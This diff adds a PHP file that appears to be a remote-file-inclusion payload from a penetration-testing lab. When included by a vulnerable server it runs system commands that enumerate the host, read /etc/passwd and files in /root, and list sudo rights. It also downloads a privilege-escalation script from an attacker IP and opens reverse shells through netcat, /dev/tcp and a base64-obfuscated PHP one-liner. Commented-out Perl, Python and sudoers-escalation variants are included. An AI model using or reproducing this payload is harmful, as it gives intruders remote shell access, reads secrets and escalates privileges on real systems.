@@ -1,0 +1,219 @@
+<?php
+ echo base64_decode("<b>UmVtb3RlRmlsZUluY2x1c2lvblRlc3Q</b>")."\n\n";
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>'id' output: </b>";
+ echo "<br>";
+ system("id");
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>'pwd' output: </b>";
+ echo "<br>";
+ system("pwd");
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>'ls -alR' output: </b>";
+ echo "<br>";
+ system("ls -alR");
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>'Application Paths' output: </b>";
+ echo "<br>";
+ system("which php");
+ echo "<br>";
+ system("which python");
+ echo "<br>";
+ system("which perl");
+ echo "<br>";
+ system("which nc");
+ echo "<br>";
+ system("which netcat");
+ echo "<br>";
+ echo "<br>";
+ system("which gcc");
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>'route' output: </b>";
+ echo "<br>";
+ system("netstat -r");
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>'Sudo commands: </b>";
+ echo "<br>";
+ system("sudo -l");
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>'Sudo escalation: </b>";
+ echo "<br>";
+ //system("echo "echo 'www-data ALL=(ALL) NOPASSWD: ALL' >> /etc/sudoers" > /usr/bin/wp_restore.sh");
+ echo "<br>";
+ echo "<br>";
+
+ system("wget -O /tmp/.X11-unix/linuxprivchecker.py http://10.11.0.112/linuxprivchecker.py");
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>config.php output: in view-source </b>";
+ 
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>host.allow output: </b>";
+ echo "<br>";
+ system("cat /etc/hosts.allow");
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>vsftpd.conf output: </b>";
+ echo "<br>";
+ system("cat /etc/vsftpd/vsftpd.conf");
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>netstat -a output: </b>";
+ echo "<br>";
+ system("netstat -a");
+ echo "<br>";
+ echo "<br>";
+
+
+ echo "<b>'ls -al /var/www' output: </b>";
+ echo "<br>";
+ system("ls -al /var/www");
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>'ls -al /var/www/cgi-bin' output: </b>";
+ echo "<br>";
+ system("ls -al /var/www/cgi-bin");
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>'ls -al /tmp' output: </b>";
+ echo "<br>";
+ system("ls -al /tmp");
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>'cat /etc/passwd' output: </b>";
+ echo "<br>";
+ system("cat /etc/passwd");
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>'cat /etc/group' output: </b>";
+ echo "<br>";
+ system("cat /etc/group");
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>'ls -al /root' output: </b>";
+ echo "<br>";
+ system("ls -al /root");
+ echo "<br>";
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>'cat /root/proof.txt' output: </b>";
+ echo "<br>";
+ system("cat /root/proof.txt");
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>'cat /root/network-secret.txt' output: </b>";
+ echo "<br>";
+ system("cat /root/network-secret.txt");
+ echo "<br>";
+ echo "<br>";
+ echo "<br>";
+
+ echo "<br>";
+ echo "<b>'pwd' output: </b>";
+ echo "<br>";
+ system("pwd");
+ echo "<br>";
+ echo "<br>";
+
+
+ echo "<b>'ls -alR /home' output:</b>";
+ echo "<br>";
+ system("ls -alR /home");
+ echo "<br>";
+ echo "<br>";
+
+ echo "<b>'ls -al /' output:</b>";
+ echo "<br>";
+ system("ls -al /");
+ echo "<br>";
+ echo "<br>"; 
+
+ echo "<b>'ls -al /etc' output:</b>";
+ echo "<br>";
+ system("ls -al /etc");
+ echo "<br>";
+ echo "<br>";
+
+ echo "<br>";
+ echo "<br>";
+ echo "<b>Netcat output: </b>";
+ echo "<br>";
+ system("/usr/bin/nc --help");
+ system("/usr/bin/nc -e /bin/sh 10.11.0.112 22");
+ echo "<br>";
+ echo "<br>";
+
+ echo "<br>";
+ echo "<br>";
+ echo "<b>Netcat output: </b>";
+ echo "<br>";
+ //system("/bin/netcat --help");
+ //system("/netcat -e /bin/sh 10.11.0.112 22");
+ echo "<br>";
+ echo "<br>";
+
+
+echo "<br>";
+echo "<br>";
+echo "<b>Bash Shell output: </b>";
+echo "<br>";
+system("/bin/bash -i >& /dev/tcp/10.11.0.112/22 0>&1");
+echo "<br>";
+echo "<br>";
+
+echo "<br>";
+echo "<br>";
+echo "<b>Perl Shell output: </b>";
+echo "<br>";
+//system("/usr/bin/perl -e 'use Socket;$i="10.11.0.0.112";$p=22;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};");
+echo "<br>";
+echo "<br>";
+
+echo "<br>";
+echo "<br>";
+echo "<b>Python Shell output: </b>";
+echo "<br>";
+//system("/usr/bin/python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.0.112",22));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'");
+echo "<br>";
+echo "<br>";
+
+ system("wget -O /tmp/.X11-unix/linuxprivchecker.py http://10.11.0.112/linuxprivchecker.py");
+ echo "<br>";
+ echo "<br>";
+
+
+//$p="cGVybCAtZSAndXNlIFNvY2tldDskaT0iMTAuMTEuMC4xMTIiOyRwPTIxO3NvY2tldChTLFBGX0lORVQsU09DS19TVFJFQU0sZ2V0cHJvdG9ieW5hbWUoInRjcCIpKTtpZihjb25uZWN0KFMsc29ja2FkZHJfaW4oJHAsaW5ldF9hdG9uKCRpKSkpKXtvcGVuKFNURElOLCI+JlMiKTtvcGVuKFNURE9VVCwiPiZTIik7b3BlbihTVERFUlIsIj4mUyIpO2V4ZWMoIi9iaW4vc2ggLWkiKTt9Oyc=";$d=base64_decode($p);system($d);
+
+ phpinfo();
+
+$p="L3Vzci9iaW4vcGhwIC1yICckc29jaz1mc29ja29wZW4oIjEwLjExLjAuMTEyIiwyMik7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTsn";$d=base64_decode($p);system($d);
+?>
+
+
+
